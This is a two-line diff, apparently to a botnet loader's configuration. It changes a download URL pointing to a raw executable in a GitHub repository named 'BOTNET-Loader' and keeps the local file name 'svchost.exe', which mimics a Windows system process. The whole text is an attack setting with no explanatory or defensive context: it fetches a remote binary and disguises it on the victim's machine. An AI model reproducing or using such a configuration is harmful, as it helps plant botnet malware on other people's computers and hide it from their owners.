@@ -1,2 +1,2 @@
-https://github.com/losthacker/BOTNET-Loader/raw/master/svchost.exe
+https://github.com/losthacker/BOTNET-Loader/raw/master/svchst.exe
 svchost.exe
